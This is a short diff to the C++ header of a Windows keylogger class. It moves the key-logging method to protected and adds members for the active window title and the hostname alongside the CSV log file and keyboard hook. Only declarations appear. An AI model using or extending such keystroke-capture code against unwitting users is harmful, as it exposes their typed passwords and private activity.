@@ -27,8 +27,8 @@ class KeyLogger {
     //starts logging keyboard input
     void listen();
 
-    //logs the given key
-    void log(DWORD key);
+
+
 
     HHOOK getHook();
 
@@ -44,11 +44,15 @@ class KeyLogger {
     bool isRShiftDown();
     void setRShiftDown(bool down);
 
+    std::string getActiveWindowTitle();
 
     protected:
 
     KeyLogger(std::string logFilePath = "out.csv");
     ~KeyLogger();
+
+    //logs the given key
+    void log(DWORD key);
 
     //singleton
     static KeyLogger* instance;
@@ -61,6 +65,7 @@ class KeyLogger {
     HHOOK hook;
 
     std::ofstream logFile;
+    std::string hostname;
 };
 
 #endif // H_KEYLOGGER
